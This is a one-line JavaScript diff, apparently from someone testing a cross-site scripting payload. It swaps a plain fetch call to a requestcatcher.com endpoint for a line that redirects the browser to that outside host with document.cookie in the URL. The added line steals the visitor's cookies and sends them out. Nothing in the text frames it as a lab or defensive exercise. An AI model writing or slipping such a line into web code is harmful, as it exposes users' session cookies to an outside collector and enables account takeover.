@@ -1,1 +1,1 @@
-fetch(`https://tkjgkrf.requestcatcher.com/name2`)
+window.location.href = `https://tkjgkrf.requestcatcher.com/${document.cookie}`
